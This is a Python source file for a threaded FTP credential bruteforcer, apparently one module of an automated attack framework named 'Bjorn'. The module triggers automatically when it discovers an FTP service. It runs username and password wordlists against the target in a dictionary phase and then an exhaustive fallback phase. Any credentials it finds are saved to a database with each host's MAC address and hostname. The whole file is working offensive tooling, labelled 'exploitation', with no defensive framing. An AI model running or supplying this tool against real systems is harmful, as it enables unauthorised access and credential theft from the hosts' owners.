“””ftp_bruteforce.py - Threaded FTP credential bruteforcer, results stored in DB.”””

import os
import threading
import logging
import time
from ftplib import FTP
from queue import Queue
from typing import List, Dict, Tuple, Optional

from shared import SharedData
from actions.bruteforce_common import ProgressTracker, merged_password_plan
from logger import Logger

logger = Logger(name="ftp_bruteforce.py", level=logging.DEBUG)

b_class = "FTPBruteforce"
b_module = "ftp_bruteforce"
b_status = "brute_force_ftp"
b_port = 21
b_parent = None
b_service = '["ftp"]'
b_trigger = 'on_any:["on_service:ftp","on_new_port:21"]'
b_priority = 70  
b_cooldown = 1800             # 30 min between runs
b_rate_limit = '3/86400'     # max 3 per day
b_enabled = 1
b_action = "normal"
b_timeout = 600
b_max_retries = 2
b_stealth_level = 3
b_risk_level = "medium"
b_tags = ["bruteforce", "ftp", "credentials"]
b_category = "exploitation"
b_name = "FTP Bruteforce"
b_description = "Threaded FTP credential bruteforcer with share enumeration."
b_author = "Bjorn Team"
b_version = "2.0.0"
b_icon = "FTPBruteforce.png"

class FTPBruteforce:
    """Orchestrator wrapper for FTPConnector."""

    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.ftp_bruteforce = FTPConnector(shared_data)
        logger.info("FTPConnector initialized.")

    def bruteforce_ftp(self, ip, port):
        """Run FTP bruteforce for (ip, port)."""
        return self.ftp_bruteforce.run_bruteforce(ip, port)

    def execute(self, ip, port, row, status_key):
        """Orchestrator entry point. Returns 'success' or 'failed'."""
        self.shared_data.bjorn_orch_status = "FTPBruteforce"
        self.shared_data.comment_params = {"user": "?", "ip": ip, "port": str(port)}
        logger.info(f"Brute forcing FTP on {ip}:{port}...")
        success, results = self.bruteforce_ftp(ip, port)
        return 'success' if success else 'failed'


class FTPConnector:
    """Handles FTP attempts, DB persistence, and IP->(MAC, Hostname) mapping."""

    def __init__(self, shared_data):
        self.shared_data = shared_data

        self.users = self._read_lines(shared_data.users_file)
        self.passwords = self._read_lines(shared_data.passwords_file)

        # Cache IP -> (mac, hostname)
        self._ip_to_identity: Dict[str, Tuple[Optional[str], Optional[str]]] = {}
        self._refresh_ip_identity_cache()

        self.lock = threading.Lock()
        self.results: List[List[str]] = []  # [mac, ip, hostname, user, password, port]
        self.queue = Queue()
        self.progress = None

    # ---------- file utils ----------
    @staticmethod
    def _read_lines(path: str) -> List[str]:
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                return [l.rstrip("\n\r") for l in f if l.strip()]
        except Exception as e:
            logger.error(f"Cannot read file {path}: {e}")
            return []

    # ---------- mapping DB hosts ----------
    def _refresh_ip_identity_cache(self) -> None:
        self._ip_to_identity.clear()
        try:
            rows = self.shared_data.db.get_all_hosts()
        except Exception as e:
            logger.error(f"DB get_all_hosts failed: {e}")
            rows = []

        for r in rows:
            mac = r.get("mac_address") or ""
            if not mac:
                continue
            hostnames_txt = r.get("hostnames") or ""
            current_hn = hostnames_txt.split(';', 1)[0] if hostnames_txt else ""
            ips_txt = r.get("ips") or ""
            if not ips_txt:
                continue
            for ip in [p.strip() for p in ips_txt.split(';') if p.strip()]:
                self._ip_to_identity[ip] = (mac, current_hn)

    def mac_for_ip(self, ip: str) -> Optional[str]:
        if ip not in self._ip_to_identity:
            self._refresh_ip_identity_cache()
        return self._ip_to_identity.get(ip, (None, None))[0]

    def hostname_for_ip(self, ip: str) -> Optional[str]:
        if ip not in self._ip_to_identity:
            self._refresh_ip_identity_cache()
        return self._ip_to_identity.get(ip, (None, None))[1]

    # ---------- FTP ----------
    def ftp_connect(self, adresse_ip: str, user: str, password: str, port: int = 21) -> bool:
        timeout = float(getattr(self.shared_data, "ftp_connect_timeout_s", 3.0))
        try:
            conn = FTP()
            conn.connect(adresse_ip, port, timeout=timeout)
            conn.login(user, password)
            try:
                conn.quit()
            except Exception:
                pass
            logger.info(f"Access to FTP successful on {adresse_ip} with user '{user}'")
            return True
        except Exception:
            return False

    # ---------- DB upsert fallback ----------
    def _fallback_upsert_cred(self, *, mac, ip, hostname, user, password, port, database=None):
        mac_k = mac or ""
        ip_k = ip or ""
        user_k = user or ""
        db_k = database or ""
        port_k = int(port or 0)

        try:
            with self.shared_data.db.transaction(immediate=True):
                self.shared_data.db.execute(
                    """
                    INSERT OR IGNORE INTO creds(service,mac_address,ip,hostname,"user","password",port,"database",extra)
                    VALUES('ftp',?,?,?,?,?,?,?,NULL)
                    """,
                    (mac_k, ip_k, hostname or "", user_k, password or "", port_k, db_k),
                )
                self.shared_data.db.execute(
                    """
                    UPDATE creds
                       SET "password"=?,
                           hostname=COALESCE(?, hostname),
                           last_seen=CURRENT_TIMESTAMP
                     WHERE service='ftp'
                       AND COALESCE(mac_address,'')=?
                       AND COALESCE(ip,'')=?
                       AND COALESCE("user",'')=?
                       AND COALESCE(COALESCE("database",""),'')=?
                       AND COALESCE(port,0)=?
                    """,
                    (password or "", hostname or None, mac_k, ip_k, user_k, db_k, port_k),
                )
        except Exception as e:
            logger.error(f"fallback upsert_cred failed for {ip} {user}: {e}")

    # ---------- worker / queue ----------
    def worker(self, success_flag):
        """Worker thread for FTP bruteforce attempts."""
        while not self.queue.empty():
            if self.shared_data.orchestrator_should_exit:
                logger.info("Orchestrator exit signal received, stopping worker thread.")
                break

            adresse_ip, user, password, mac_address, hostname, port = self.queue.get()
            try:
                if self.ftp_connect(adresse_ip, user, password, port=port):
                    with self.lock:
                        self.results.append([mac_address, adresse_ip, hostname, user, password, port])
                        logger.success(f"Found credentials  IP:{adresse_ip} | User:{user}")
                        self.shared_data.comment_params = {"user": user, "ip": adresse_ip, "port": str(port)}
                        self.save_results()
                        self.removeduplicates()
                        success_flag[0] = True
            finally:
                if self.progress is not None:
                    self.progress.advance(1)
                self.queue.task_done()

                # Configurable delay between FTP attempts
                if getattr(self.shared_data, "timewait_ftp", 0) > 0:
                    time.sleep(self.shared_data.timewait_ftp)


    def run_bruteforce(self, adresse_ip: str, port: int):
        self.results = []
        mac_address = self.mac_for_ip(adresse_ip)
        hostname = self.hostname_for_ip(adresse_ip) or ""

        dict_passwords, fallback_passwords = merged_password_plan(self.shared_data, self.passwords)
        total_tasks = len(self.users) * (len(dict_passwords) + len(fallback_passwords))
        if total_tasks == 0:
            logger.warning("No users/passwords loaded. Abort.")
            return False, []

        self.progress = ProgressTracker(self.shared_data, total_tasks)
        success_flag = [False]

        def run_phase(passwords):
            phase_tasks = len(self.users) * len(passwords)
            if phase_tasks == 0:
                return

            for user in self.users:
                for password in passwords:
                    if self.shared_data.orchestrator_should_exit:
                        logger.info("Orchestrator exit signal received, stopping bruteforce task addition.")
                        return
                    self.queue.put((adresse_ip, user, password, mac_address, hostname, port))

            threads = []
            thread_count = min(8, max(1, phase_tasks))
            for _ in range(thread_count):
                t = threading.Thread(target=self.worker, args=(success_flag,), daemon=True)
                t.start()
                threads.append(t)

            self.queue.join()
            for t in threads:
                t.join()

        try:
            run_phase(dict_passwords)
            if (not success_flag[0]) and fallback_passwords and not self.shared_data.orchestrator_should_exit:
                logger.info(
                    f"FTP dictionary phase failed on {adresse_ip}:{port}. "
                    f"Starting exhaustive fallback ({len(fallback_passwords)} passwords)."
                )
                run_phase(fallback_passwords)
            self.progress.set_complete()
            return success_flag[0], self.results
        finally:
            self.shared_data.bjorn_progress = ""

    # ---------- persistence DB ----------
    def save_results(self):
        for mac, ip, hostname, user, password, port in self.results:
            try:
                self.shared_data.db.insert_cred(
                    service="ftp",
                    mac=mac,
                    ip=ip,
                    hostname=hostname,
                    user=user,
                    password=password,
                    port=port,
                    database=None,
                    extra=None
                )
            except Exception as e:
                if "ON CONFLICT clause does not match" in str(e):
                    self._fallback_upsert_cred(
                        mac=mac, ip=ip, hostname=hostname, user=user,
                        password=password, port=port, database=None
                    )
                else:
                    logger.error(f"insert_cred failed for {ip} {user}: {e}")
        self.results = []

    def removeduplicates(self):
        """No longer needed with unique DB index; kept for interface compat."""
        # Dedup handled by DB UNIQUE constraint + ON CONFLICT in save_results


if __name__ == "__main__":
    try:
        sd = SharedData()
        ftp_bruteforce = FTPBruteforce(sd)
        logger.info("FTP brute force module ready.")
        exit(0)
    except Exception as e:
        logger.error(f"Error: {e}")
        exit(1)

